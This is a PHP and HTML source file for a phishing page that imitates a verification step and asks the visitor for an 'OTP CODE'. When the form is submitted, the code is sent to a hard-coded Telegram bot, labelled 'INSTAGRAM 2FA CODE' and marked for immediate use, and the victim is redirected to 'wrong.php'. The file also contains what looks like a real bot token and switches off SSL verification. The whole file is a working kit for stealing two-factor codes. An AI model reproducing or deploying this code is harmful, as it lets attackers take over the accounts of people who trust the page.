<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Configuration
$botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
$chatId = ''; // We'll get this from file or set it directly

// Function to send message to Telegram using cURL
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    
    error_log("cURL Debug - HTTP Code: $httpCode, Error: $curlError, Response: $result");
    
    curl_close($ch);
    
    if ($result === false) {
        error_log("Failed to send Telegram message - cURL error: " . $curlError);
        return false;
    }
    
    if ($httpCode !== 200) {
        error_log("HTTP Error: $httpCode - Response: $result");
        return false;
    }
    
    $response = json_decode($result, true);
    
    if (isset($response['ok']) && $response['ok']) {
        error_log("Telegram message sent successfully");
        return true;
    } else {
        $errorMsg = isset($response['description']) ? $response['description'] : 'Unknown error';
        error_log("Telegram API Error: " . $errorMsg);
        return false;
    }
}

$message = '';
$success = false;

// Load chat ID from file
if (file_exists('telegram_chat_id.txt')) {
    $chatId = trim(file_get_contents('telegram_chat_id.txt'));
} else {
    // If file doesn't exist, create it with a placeholder
    file_put_contents('telegram_chat_id.txt', 'YOUR_CHAT_ID_HERE');
    $chatId = 'YOUR_CHAT_ID_HERE';
}

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    error_log("Form submitted - POST data: " . print_r($_POST, true));
    
    if (isset($_POST['user_otp']) && !empty(trim($_POST['user_otp']))) {
        $otp = trim($_POST['user_otp']);
        
        if ($chatId === 'YOUR_CHAT_ID_HERE' || empty($chatId)) {
            $message = "❌ Chat ID not configured. Please set your chat ID in telegram_chat_id.txt";
        } else {
            $telegramMessage = "🔐 INSTAGRAM 2FA CODE\n\n";
            $telegramMessage .= "📱 Code: <b>{$otp}</b>\n";
            $telegramMessage .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
            $telegramMessage .= "⚠️ USE IMMEDIATELY-TIME SENSITIVE";
            
            error_log("Attempting to send to Telegram - Chat ID: {$chatId}");
            
            if (sendTelegramMessage($chatId, $telegramMessage, $botToken)) {
                $success = true;
               
                header("refresh:0;url=wrong.php");
            } else {
                $message = "❌ Failed ";
            }
        }
    } else {
        $message = "❌ Please enter a valid OTP code.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Check your email</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
        body {
            font-family: 'Roboto', sans-serif;
        }
        .shake {
            animation: shake 0.5s;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
    </style>
</head>
<body class="bg-gradient-to-br from-blue-50 to-green-50 min-h-screen flex flex-col">
  
<main class="flex-grow px-5 pt-5 pb-10 flex items-center justify-center">
    <section class="max-w-md w-full">
        <h1 class="text-gray-900 font-extrabold text-xl mb-2 text-left">
            Enter OTP CODE
        </h1>
        <p class="text-gray-800 text-sm mb-4 text-left">
            Enter the code that we sent to
            <span class="font-semibold">your phone</span>
        </p>
        
        <?php if (!empty($message)): ?>
            <div class="mb-4 p-4 rounded-lg <?php echo $success ? 'bg-green-100 border border-green-400 text-green-700' : 'bg-red-100 border border-red-400 text-red-700'; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <div class="rounded-lg bg-green-100 p-5 mb-5">
            <img alt="Security illustration" class="w-full rounded-lg" height="120" loading="lazy" src="https://i.postimg.cc/rmTq7N6b/ZXDhq-U01-Coo.png" width="320"/>
        </div>
        
        <form method="POST" action="" id="otpForm" onsubmit="return validateForm()">
            <div class="mb-5">
                <input 
                    type="text" 
                    name="user_otp" 
                    id="otpInput"
                    class="w-full border border-gray-300 rounded-md px-3 py-2 text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-blue-400" 
                    placeholder="Enter verification code"
                    maxlength="8"
                    pattern="[0-9]{4,8}"
                    title="Please enter a 4-8 digit code"
                    required
                    autocomplete="off"
                />
            </div>
            
            <button type="button" onclick="requestNewCode()" class="flex items-center space-x-2 text-blue-700 font-semibold text-sm mb-6 hover:text-blue-800">
                <i class="fas fa-redo-alt text-base"></i>
                <span>Get a new code</span>
            </button>
            
            <button 
                type="submit" 
                id="submitBtn" 
                class="w-full bg-blue-800 hover:bg-blue-900 text-white text-base font-normal rounded-full py-3 transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
                <span id="btnText">Continue</span>
                <i id="btnSpinner" class="fas fa-spinner fa-spin ml-2 hidden"></i>
            </button>
        </form>
        
        <!-- Debug info (remove in production) -->
        <?php if (isset($_GET['debug'])): ?>
            <div class="mt-4 p-3 bg-gray-100 rounded text-xs">
                <strong>Debug Info:</strong><br>
                Chat ID: <?php echo htmlspecialchars($chatId); ?><br>
                Bot Token: <?php echo substr($botToken, 0, 10) . '...'; ?><br>
                POST Data: <?php echo htmlspecialchars(print_r($_POST, true)); ?>
            </div>
        <?php endif; ?>
    </section>
</main>

<script>
function validateForm() {
    const otpInput = document.getElementById('otpInput');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnSpinner = document.getElementById('btnSpinner');
    
    const otp = otpInput.value.trim();
    
    if (otp.length < 4) {
        otpInput.classList.add('shake', 'border-red-500');
        setTimeout(() => {
            otpInput.classList.remove('shake', 'border-red-500');
        }, 500);
        return false;
    }
    
    // Show loading state
    submitBtn.disabled = true;
    btnText.textContent = 'Sending...';
    btnSpinner.classList.remove('hidden');
    
    return true;
}

function requestNewCode() {
    alert('A new code has been requested. Please check your sms/email.');
}

// Auto-focus on input
document.getElementById('otpInput').focus();

// Only allow numbers
document.getElementById('otpInput').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});
</script>

</body>
</html>
